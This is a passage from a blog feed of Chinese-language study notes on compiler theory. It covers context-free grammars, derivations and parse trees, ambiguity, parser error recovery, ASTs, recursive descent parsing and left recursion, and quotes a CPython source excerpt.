b<br></code></pre></td></tr></table></figure><p>那么对于 "ab" 这个串，一种推倒方式是 S -&gt; S1 -&gt; ab，另一种是 S-&gt; S2 -&gt; AB -&gt; aB -&gt; ab。前一种要把 "ab"合起来，后一种要分开，这只是说明该文法有歧义，而不能说这是一个上下文有关文法。事实上，还有一些上下文无关语言是固有歧义的（能产生该语言的每一种上下文无关文法都有歧义）。</p><p>上下文无关文法就是说这个文法中<strong>所有的产生式左边只有一个非终结符</strong>，比如：</p><p>S -&gt; aSb</p><p>S -&gt; ab</p><p>这个文法有两个产生式，每个产生式左边只有一个非终结符S，这就是上下文无关文法，因为你只要找到符合产生式右边的串，就可以把它归约为对应的非终结符。</p><p>比如：</p><p>aSb -&gt; aaSbb</p><p>S -&gt; ab</p><p>这就是上下文相关文法，因为它的第一个产生式左边有不止一个符号，所以你在匹配这个产生式中的S的时候必需确保这个S有正确的“上下文”，也就是左边的a和右边的b，所以叫上下文相关文法</p><p>在替换的时候，不是直接替换，还要考虑左边符号的左右环境</p><p>现代编译器和字节码？</p><p>typescript？</p><p>编译的概念是什么？</p><p>为什么正则语言不能用于文法解析？因为正则语言无法处理递归的嵌套结构，不信你用正则写一个嵌套任意层级的if-else试试？</p><p>为什么要有空转换：A -&gt; epsilon ?主要是未来消耗某个非终结符哈，以预测一个字符为例：</p><p>T[E, t] = a,t是一个预测字符，<strong>有一个特殊的情况，epsilon用于消耗某个非终结符</strong>，如X-&gt; E | epsilon</p><p>LL和LR差异</p><p>什么是LL(1),是语言还是解析器？其性质是什么，什么样的文法才是LL(1)</p><p>如何避免左递归</p><p>名次辨识：语言，语法，production， item，viableprefix，handle，解析器</p><p>LL1指的是文法</p><p>language:对于人类来说，符合一些既定规则（语法）的文本标记就是语言，语言通常是针对人来说的，而语义往往人类察觉不到，语法则是帮助人们理解语义的一座桥梁</p><p>grammar：语法是构成语义的重要组成部分，可以说两者是相辅相成的，语法&lt;=&gt; 语义</p><p>semantics：编程语言里的语义是指组成句子的单元之间的关系，这个关系是结构化的，而每个单元也是可以结构化的</p><p>Production:</p><p>Handle:句柄（handle）是一个来自编译原理的术语，指的是一个句子中最先被规约的部分，所以带有一个「句」字。</p><p>Viable prefix：:</p><p>Parser: 把序列文本转成结构化语义的分析器</p><p>Item:</p><p><a href="https://www.zhihu.com/question/20607178">(2 封私信 / 34条消息) 运行时（runtime）是什么意思？应该怎样深入且直观地理解？ - 知乎(zhihu.com)</a></p><p>运行时库不仅包含include的，也包含编译器自动插入的；</p><p>https://zhuanlan.zhihu.com/p/71718231</p><p>以类为例，大致的一个编译流程：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-keyword">Class</span> Student &#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">int</span> a;<br><span class="hljs-built_in">int</span> <span class="hljs-keyword">name</span>;<br>void <span class="hljs-built_in">print</span>() &#123;&#125;;<br>Student(<span class="hljs-built_in">int</span> <span class="hljs-keyword">name</span>, <span class="hljs-built_in">int</span> age) &#123;<br>a = age;<br><span class="hljs-keyword">name</span> = <span class="hljs-keyword">name</span>;<br>&#125;<br>&#125;<br><br>s = new Student(<span class="hljs-number">2</span>);<br>s.<span class="hljs-built_in">print</span>();<br><br>编译类时：在Symbol Table里注册，并记录该类的信息：[Student, <span class="hljs-number">16</span>, a, <span class="hljs-keyword">name</span>, ptr] // Student是标识符，a是其中一个属性, <span class="hljs-number">8</span>是该类的大小，同时有个指向代码段的指针ptr<br><br>编译new语句时，在Symbol中找到该类，找到后寻找第一个offset的值也就是类大小<span class="hljs-number">8</span>，<span class="hljs-keyword">call</span>，malloc <span class="hljs-number">16</span> byte的空间， 第一个参数<span class="hljs-keyword">name</span>，<span class="hljs-keyword">name</span>的偏移量是<span class="hljs-number">8</span>；处理第二个参数a偏移量是<span class="hljs-number">4</span>。<br><br>编译S.<span class="hljs-built_in">print</span>时，找到ptr指向的地址，编译对应的函数即可；如果函数里使用了变量，优先在参数和局部变量找（具体看怎么实施的），然后去当前的这个类里找；<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">a = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]<br>b = [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br><span class="hljs-built_in">sum</span>(a, b)<br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Runtime Error (NZEC)<br>Traceback (most recent call <span class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;script.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">3</span>, <span class="hljs-keyword">in</span> <br>    <span class="hljs-built_in">sum</span>(<span class="hljs-keyword">a</span>, b)<br>TypeError: can only concatenate list (<span class="hljs-keyword">not</span> <span class="hljs-string">&quot;int&quot;</span>) <span class="hljs-built_in">to</span> list<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c">tupleconcat(PyTupleObject *a, PyObject *bb)<br>&#123;<br>    Py_ssize_t size;<br>    Py_ssize_t i;<br>    PyObject **src, **dest;<br>    PyTupleObject *np;<br>    <span class="hljs-keyword">if</span> (Py_SIZE(a) == <span class="hljs-number">0</span> &amp;&amp; PyTuple_CheckExact(bb)) &#123;<br>        <span class="hljs-keyword">return</span> Py_NewRef(bb);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!PyTuple_Check(bb)) &#123;<br>        PyErr_Format(PyExc_TypeError,<br>             <span class="hljs-string">&quot;can only concatenate tuple (not \&quot;%.200s\&quot;) to tuple&quot;</span>,<br>                 Py_TYPE(bb)-&gt;tp_name);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    PyTupleObject *b = (PyTupleObject *)bb;<br><br>    <span class="hljs-keyword">if</span> (Py_SIZE(b) == <span class="hljs-number">0</span> &amp;&amp; PyTuple_CheckExact(a)) &#123;<br>        <span class="hljs-keyword">return</span> Py_NewRef(a);<br>    &#125;<br>    assert((<span class="hljs-type">size_t</span>)Py_SIZE(a) + (<span class="hljs-type">size_t</span>)Py_SIZE(b) &lt; PY_SSIZE_T_MAX);<br>    size = Py_SIZE(a) + Py_SIZE(b);<br>    <span class="hljs-keyword">if</span> (size == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> tuple_get_empty();<br>    &#125;<br><br>    np = tuple_alloc(size);<br>    <span class="hljs-keyword">if</span> (np == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    src = a-&gt;ob_item;<br>    dest = np-&gt;ob_item;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; Py_SIZE(a); i++) &#123;<br>        PyObject *v = src[i];<br>        dest[i] = Py_NewRef(v);<br>    &#125;<br>    src = b-&gt;ob_item;<br>    dest = np-&gt;ob_item + Py_SIZE(a);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; Py_SIZE(b); i++) &#123;<br>        PyObject *v = src[i];<br>        dest[i] = Py_NewRef(v);<br>    &#125;<br>    _PyObject_GC_TRACK(np);<br>    <span class="hljs-keyword">return</span> (PyObject *)np;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>https://eli.thegreenplace.net/2010/06/30/python-internals-adding-a-new-statement-to-python/</p><p>https://zoo.cs.yale.edu/classes/cs200/lectures/PVM.html</p><p>https://zhuanlan.zhihu.com/p/25850970</p><p><a href="https://zhuanlan.zhihu.com/p/572308619">python的dis模块简介- 知乎 (zhihu.com)</a></p><p>像这些语言的字节码包含了很多动态判断（智能化），转成了C代码。</p><p>C写的编译器经过编译得到了Cpython（就是个可执行文件），字节码 =&gt;Cpython(C实现的去处理字节码) =&gt; output</p><p>RN(flutter)， React源码，OS，wasm, C++</p>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 3 Parsing Analysis 1 (Introduction &amp; LL Analysis)</title>
    <link href="/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%89/"/>
    <url>/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><p>Regular languages</p><ul><li>The weakest formal languages widely used</li><li>Many applications</li></ul><p>正则表达式的缺陷：</p><ul><li></li></ul><p>Parser：</p><ul><li>Input: sequence of tokens from lexer</li><li>Output: parse tree pf the program</li></ul><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs hsp">Cool:<br><span class="hljs-keyword">if</span> x = y then <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">2</span> fi<br>Parser <span class="hljs-keyword">input</span>:<br><span class="hljs-keyword">IF</span> ID = ID THEN <span class="hljs-keyword">INT</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-keyword">INT</span> FI<br>Parser output:<br> <span class="hljs-keyword">IF</span>-THEN-<span class="hljs-keyword">ELSE</span><br>=      <span class="hljs-keyword">INT</span>      <span class="hljs-keyword">INT</span><br>ID ID    <br></code></pre></td></tr></table></figure><table><thead><tr class="header"><th>Phase</th><th>Intput</th><th>Output</th></tr></thead><tbody><tr class="odd"><td>Lexer</td><td>String of characters</td><td>String of tokens</td></tr><tr class="even"><td>Parser</td><td>String of tokens</td><td>Parse tree</td></tr></tbody></table><blockquote><p>上面两步有的编译器是分开做的，有的编译器是放在一起做的</p></blockquote><h2 id="上下无关文法">上下无关文法</h2><p>由词法分析器得到的tokens并不全是有用的，比如标点符号，所以编译器必须识别哪些是有效token，哪些是无效的，我们需要一种描述规则来描述何为有效token，以及一种识别有效token的方法</p><p>程序语言都是有着nested(递归)的结构，如：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss">EXPR = <span class="hljs-keyword">if</span> <span class="hljs-keyword">EXPR</span> then <span class="hljs-keyword">EXPR</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">EXPR</span> fi<br><span class="hljs-keyword">while</span> <span class="hljs-keyword">EXPR</span> loop <span class="hljs-keyword">EXPR</span> pool<br></code></pre></td></tr></table></figure><p><strong>上下无关文法据说一种描述这种递归结构的naturalnotation</strong></p><p>CFG 由下面几部分构成：</p><ul><li>a set of terminals: <span class="math inline">\(T\)</span></li><li>a set of nn-terminals: <span class="math inline">\(N\)</span></li><li>a start symbol: <span class="math inline">\(S (S \inN)\)</span></li><li>a set of productions:$ X -&gt; Y_1, ... Y_N (X N, Y_i N T {})$</li></ul><ol type="1"><li>Begin with a string with only the start symbol S</li><li>Replace any non-terminal X in the string by the right-hand side ofsome production</li><li>Repeat (2) until there are non-terminals</li></ol><p>let G be a contexto-free grammar with start symbol S. Then thelanguage L(G) of is: <span class="math display">\[\{ a_1, ... a_n \quad | \quad \forall_i \quad a_i \in T \and S\mathop{\rightarrow}^* a_1, ..., a_n \}\]</span></p><ul><li>Terminals are so-called because there are no-reulses for replacingthem 终结符是不变的</li><li>Once generated, terminals are permanent，终结符是不变的</li><li>Terminals ought to be tokens of the language(终结符一般是语言的token，比如关键字，标识符)</li></ul><p>🌰：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xquery">E -&gt; E + E<br> | E * E<br> | (E)<br> |<span class="hljs-built_in"> id</span><br> <br>对应的语言：<span class="hljs-built_in"></span><br><span class="hljs-built_in">id</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">id</span> +<span class="hljs-built_in"> id</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">id</span> +<span class="hljs-built_in"> id</span> *<span class="hljs-built_in"> id</span><br><span class="hljs-built_in">(id</span> +<span class="hljs-built_in"> id</span>) *<span class="hljs-built_in"> id</span><br></code></pre></td></tr></table></figure><p>整个CFG是一个很大的步骤，需要：</p><ul><li>Membership in a alnguage is yes or no, also parse tree of theinput</li><li>Must handle errors gracefully</li><li>Need an implementation of CFG's (eg: bison)</li></ul><h2 id="derivations推导">Derivations(推导)</h2><p>A derivations s a <strong>sequence</strong> f production: <spanclass="math display">\[S -&gt; .. -&gt; ,,, -&gt; ... -&gt; ..\]</span> 推导过程可以以树的形式画出来：</p><ul><li>start symbol is the tree's root</li><li>For a production <spanclass="math inline">\(X-&gt;Y_1Y_2..Y_n\)</span> add children <spanclass="math inline">\(Y_1Y_2...Y_n\)</span> o node X</li></ul><p>考虑下面语法： <span class="math display">\[E → E + E |  E * E | (E) | id\]</span> 以及字符串：id * id + id</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617134603437.png"alt="image-20230617134603437" /><figcaption aria-hidden="true">image-20230617134603437</figcaption></figure><p>A parse tree has</p><ul><li>Terminals at the leaves</li><li>Non-terminals at the interior nodes</li></ul><blockquote><p>对叶子节点的in-order遍历就是原始输出，parsetree表示了token之间的各种关系</p><p>如下：</p><p>叶子节点从左到右：就是原始输入：id * id + id</p><p>中间节点和左右兄弟节点的关系也很明确，*的左右就是id</p></blockquote><p>上述推导式的产生是left-most，即在每一步优先推导最左边的符号（即推导方向是自左向右），但是这样可能会出现没有结束条件而一直无限推导下去。还有一种与之类似的right-most推导</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">E<br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">E + E</span><br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">E + <span class="hljs-built_in">id</span></span><br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">E * E + <span class="hljs-built_in">id</span></span><br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">E * <span class="hljs-built_in">id</span> + <span class="hljs-built_in">id</span></span><br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash"><span class="hljs-built_in">id</span> * <span class="hljs-built_in">id</span> + <span class="hljs-built_in">id</span></span><br></code></pre></td></tr></table></figure><blockquote><p>Note that r-most and l-most derivations have the same parse tree</p><p>A derivations defines a parse tree, but one parse tree may have manyderivations</p><p>一个Parse tree可能有很多种推导方式可以得到，但是最左推导和最右推导是最重要的两种方式</p></blockquote><p><strong>Conclusion</strong>:</p><ul><li>不仅对某个字符串是否属于L(G)(语法G所产生的语言)感兴趣，也需要对应的解析树</li><li>一个推导式定义了一个解析树（或者解析树的一部分），同一个Parse tree可能有很多种推导方式可以得到</li></ul><h2 id="ambiguity语法的二义性">Ambiguity(语法的二义性)</h2><h3 id="解析优先级">解析优先级</h3><p>Grammar: E -&gt; E + E | E * E | (E) | id</p><p>String stream: id * id + id</p><p>不同的推导得到不同的parse tree：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">E</span><br><span class="hljs-built_in">E</span> <span class="hljs-operator">+</span> <span class="hljs-built_in">E</span><br><span class="hljs-built_in">E</span> <span class="hljs-operator">*</span> <span class="hljs-built_in">E</span> <span class="hljs-variable">id</span><br><span class="hljs-variable">id</span>  <span class="hljs-variable">id</span> <br><br><span class="hljs-built_in">E</span><br><span class="hljs-built_in">E</span>  <span class="hljs-operator">*</span>  <span class="hljs-built_in">E</span><br>  <span class="hljs-variable">id</span>  <span class="hljs-built_in">E</span> <span class="hljs-operator">+</span> <span class="hljs-built_in">E</span><br> <span class="hljs-variable">id</span>   <span class="hljs-variable">id</span> <br></code></pre></td></tr></table></figure><blockquote><p>A grammar is ambiguous if it has more than one parse tree for somestring, 换句话说，对于某些字符串，可以由超过一种的做作或最右推导方式</p></blockquote><p><strong>How to handle ambiguous</strong></p><p>Method 1:</p><p>重写语法：其实本质上是强制了解析时候的优先级</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">E -&gt; <span class="hljs-string">E&#x27; + E/E&#x27;</span><br><span class="hljs-string">E&#x27; -&gt; id * E&#x27;</span> | id | (E) * <span class="hljs-string">E&#x27;| (E) </span><br></code></pre></td></tr></table></figure><p>Method 2：</p><p>不重写，但是在解析的时候，使用优先级或者判断哪个是最优的</p><h3 id="结合性">结合性</h3><h2 id="parsing-error-handleparser过程的错误处理">Parsing ErrorHandle(parser过程的错误处理)</h2><table><thead><tr class="header"><th>Error kind</th><th>Example</th><th>Detected by</th></tr></thead><tbody><tr class="odd"><td>Lexical</td><td>使用了未知符号，比如else写成了eles</td><td>Lexer</td></tr><tr class="even"><td>Syntax</td><td>编写的程序存在结构错误，比如while后面应该有一对{},但是只写了一个{</td><td>parser</td></tr><tr class="odd"><td>Semantic</td><td>int x; x(3);声明x为普通变量，但是却把x当成函数使用</td><td>Type Checker</td></tr><tr class="even"><td>Correctness</td><td>自己的代码虽然通过了编译器，但是运行结果不符合预期</td><td>User/Tester，一般需要自己debug</td></tr></tbody></table><p>Error handler should:</p><ul><li>Report errors accurately and clearly</li><li>Recover from an error quickly</li><li>Not slow down compilation of valid code</li></ul><p>常见的三种不同错误处理模式：</p><ul><li>Panic Mode (使用特殊的终止符(error)吃掉错误，继续执行)<ul><li>When an error is detected<ul><li>Discard tokens until one with clear role is found</li><li>Continue from here</li></ul></li></ul></li></ul><p>​ 🌰：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">(1 + + 2) + 2<br><span class="hljs-keyword">skip </span>ahead to next interger and then continue<br></code></pre></td></tr></table></figure><p>Bison: use the special terminal error to descide how mucg input toskip</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">E -&gt; int | <span class="hljs-type">E</span> + E | <span class="hljs-type">(E</span>) | <span class="hljs-type">error</span> int | <span class="hljs-type">(error</span>)<br></code></pre></td></tr></table></figure><ul><li><p>Error productions (添加可能的错误的推导式): specify known commonmistakes in the grammar</p><p>Eg: write 5 x instead of 5 * x</p><p>Add production E -&gt; .... | E E</p><p>Disadvantage: complicates the grammar</p></li><li><p>Automatic local or global correction</p><ul><li>Find a correct "nearby" program<ul><li>try token insertions and deletions (编辑距离)</li><li>exhaustive search</li></ul></li><li>Disadvantages:<ul><li>hard to impl</li><li>slows down parsing of correct programs</li><li>"nearby" is not necessarily "the intended" program</li></ul></li></ul></li></ul><p>Past:</p><ul><li>Slow recompilation cycle (even once a day)</li><li>rind as many errors in one cycle as possible</li></ul><p>Present:</p><ul><li>Quick recompilation cycle</li><li>users tend to correct one error/cycle</li><li>Complex error recovery is less compelling</li></ul><h2 id="another-clean-parse-tree-form-ast">Another Clean Parse Tree Form—— AST</h2><p>Parser跟踪(trace)一个token序列的推导过程，并由此产生Parse tree</p><p>🌰：</p><p>Grammar: E -&gt; int | (E) | E + E</p><p>After lexical analysis: [Int(2), '+', '(', Int(1), '+', 'Int(5),')']</p><p>Parse Tree:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">E<br>E + E<br><span class="hljs-built_in">int</span>(<span class="hljs-number">2</span>) (E)<br>E + E<br><span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>) <span class="hljs-built_in">int</span>(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p>AST：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-attr">[Plus, leftO, rightO]</span><br><span class="hljs-built_in">Int</span>(<span class="hljs-number">2</span>)  <span class="hljs-selector-attr">[Plus, leftO, rightO]</span><br><span class="hljs-built_in">Int</span>(<span class="hljs-number">1</span>) <span class="hljs-built_in">Int</span>(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p>被称之为AST，因为它从具体语法中抽象出来，煎炒了具体语法的细节；而ParseTree展示了具体的推导规则和相关结构，对于编译器来水说，有很多不必要的内容</p><h3 id="递归下降解析">递归下降解析</h3><p>解析树一般按照如下方式构建：</p><ul><li>自上至下</li><li>从左到右</li></ul><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span><br><span class="hljs-built_in">t2</span>. <span class="hljs-number">3</span>.  <span class="hljs-built_in">t9</span><br>   <span class="hljs-number">4</span>. <span class="hljs-number">7</span> <br>  <span class="hljs-built_in">t5</span>. <span class="hljs-built_in">t6</span>.  <span class="hljs-built_in">t8</span><br></code></pre></td></tr></table></figure><p>Tokens: [t2, t5, t6, t8, t9]</p><p>看一个详细的递归下降解析的🌰：</p><p>考虑语法Grammar:</p><p>E -&gt; T | T | T + E</p><p>T -&gt; int | int * T | (E)</p><p>输入：<span class="math inline">\((int_5)\)</span></p><p>步骤：</p><p>从起始菲终结符开始，依次尝试关于E的推导式</p><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ocaml"><span class="hljs-type">E</span> -&gt; <span class="hljs-type">T</span> -&gt; <span class="hljs-built_in">int</span> (mismatch: <span class="hljs-built_in">int</span> does not <span class="hljs-keyword">match</span> (, backtrack) =&gt;<br> <span class="hljs-type">T</span> -&gt; [<span class="hljs-built_in">int</span> * <span class="hljs-type">T</span>] (mismatch: <span class="hljs-built_in">int</span> does not <span class="hljs-keyword">match</span> (, backtrack) =&gt;<br> <span class="hljs-type">T</span> -&gt; ( <span class="hljs-type">E</span> ) (<span class="hljs-keyword">match</span>: 继续下一个输入字符<span class="hljs-built_in">int</span> =&gt;<br> <span class="hljs-type">T</span> -&gt; ( <span class="hljs-type">E</span> -&gt; <span class="hljs-built_in">int</span> ) (<span class="hljs-keyword">match</span>: 继续下一个输入字符) =&gt;<br></code></pre></td></tr></table></figure><p>递归下降解析算法的一般定义如下：</p><p>首先定义几个关于是否符合某个匹配的函数：</p><ul><li><p>是否为终结符：</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">bool</span> <span class="hljs-title function_">term</span>(<span class="hljs-params">TOKEN</span> <span class="hljs-params">tok</span>) &#123;<span class="hljs-keyword">return</span> <span class="hljs-operator">*</span><span class="hljs-variable">next</span><span class="hljs-operator">+</span><span class="hljs-operator">+</span> <span class="hljs-operator">==</span> <span class="hljs-variable">tok</span>&#125;<br></code></pre></td></tr></table></figure></li><li><p>是否为lfs为S第n个推导式：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">Sn</span>()</span> &#123;&#125;<br></code></pre></td></tr></table></figure></li><li><p>是否为lfs为S的推导式</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">S</span>()</span> &#123;&#125;<br></code></pre></td></tr></table></figure></li></ul><p>🌰：</p><ul><li><p>E -&gt; T: bool E1() { return T() }</p></li><li><p>E -&gt; T + E: bool E2() { return T() &amp;&amp; term(PLUS)&amp;&amp; E() }</p></li><li><p>对于整个E来说：</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs q">bool E() &#123;<br>TOKEN *<span class="hljs-built_in">save</span> = <span class="hljs-built_in">next</span>;<br>return (<span class="hljs-built_in">next</span> = <span class="hljs-built_in">save</span>, E1()) || (<span class="hljs-built_in">next</span> = <span class="hljs-built_in">save</span>, E2());<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>同样的对于上面的非终结符T，有：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">T1</span>()</span> &#123;<br><span class="hljs-keyword">return</span> term(INT);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">T2</span>()</span> &#123;<br><span class="hljs-keyword">return</span> term(INT) &amp;&amp; term(TIMES) &amp;&amp; T();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">T3</span>()</span> &#123;<br><span class="hljs-keyword">return</span> term(OPEN) &amp;&amp; E() &amp;&amp; term(CLOSE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">T</span>()</span> &#123;<br> TOKEN *save = next;<br><span class="hljs-keyword">return</span> (next = save, T1()) || (next = save, T2() || (next = save, T3()));<br>&#125;<br></code></pre></td></tr></table></figure><p>整个步骤：</p><ul><li>初始化next为第一个token</li><li>调用E()</li></ul><p><strong>Conslusion</strong>:</p><p>递归下降过程中，不断地递归合回溯所产生的函数调用结构其实就是解析树的体现，所以在递归下降的同时构建AST。</p><h3 id="上面的递归下降算法的限制">上面的递归下降算法的限制：</h3><p>对于E -&gt; T | T | T +E，一旦递归到了T，并且从继续向下递归，一旦不符合了，只会在当前层级尝试其他的推导式，但是不会基于T的同层级去尝试T和T+E</p><p>所以上面的普通的递归下降只适用于一部分语法，对于有些不符合的语法，可以采用左因子(left-factor)进行改写：</p><h3 id="左递归">左递归</h3><p>考虑产生式：S -&gt; S a</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">bool <span class="hljs-built_in">S1</span>() &#123; return <span class="hljs-built_in">S</span>() &amp;&amp; <span class="hljs-built_in">term</span>()&#125;<br>bool <span class="hljs-built_in">S</span>() &#123; return <span class="hljs-built_in">S1</span>()&#125;<br></code></pre></td></tr></table></figure><p>如果使用递归下降，会产生如下的调用链条：S =&gt; S1 =&gt; S =&gt; S1=&gt; ...</p><p>这就是左递归语法</p><p>以下是左递归语法更一般的定义： <span class="math display">\[S \mathop{\rightarrow}^+ S\alpha 